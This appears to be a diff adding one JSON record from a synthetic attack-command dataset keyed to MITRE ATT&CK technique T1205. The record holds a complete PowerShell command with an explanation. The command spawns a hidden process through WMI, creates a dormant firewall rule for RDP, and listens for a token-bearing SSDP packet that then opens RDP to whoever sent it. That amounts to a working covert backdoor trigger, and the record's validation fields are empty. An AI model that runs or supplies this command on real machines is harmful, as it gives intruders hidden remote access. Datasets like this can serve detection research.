@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-RDP-SSDP'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-RDP-SSDP'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-RDP-SSDP'' -Enabled False }; $u=New-Object System.Net.Sockets.UdpClient(1900); $ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0); while($true){ $d=$u.Receive([ref]$ep); $s=[Text.Encoding]::ASCII.GetString($d); if(($s -like ''*M-SEARCH*'') -and ($s -like ''*ST: urn:schemas-upnp-org:device:InternetGatewayDevice:1*'') -and ($s -like ''*X-Token: abc123*'')){ Set-NetFirewallRule -DisplayName ''Signal-Open-RDP-SSDP'' -Enabled True -RemoteAddress $ep.Address; break } } }'",
+  "explanation": "Inspects SSDP discovery traffic on UDP/1900 for a crafted M-SEARCH request with a specific ST target and custom header token. This UPnP/SSDP-format signal toggles RDP firewall allowance for the sender.",
+  "rationale_steps": [
+    "Create disabled firewall rule for TCP/3389.",
+    "Listen on UDP/1900 and parse ASCII SSDP headers for ST and token.",
+    "Enable the firewall rule when the crafted M-SEARCH is received."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-5411a282-aa94b416",
+  "source_prompt_hash": "5411a282",
+  "timestamp_utc": "2025-09-30T03:46:23.408122Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
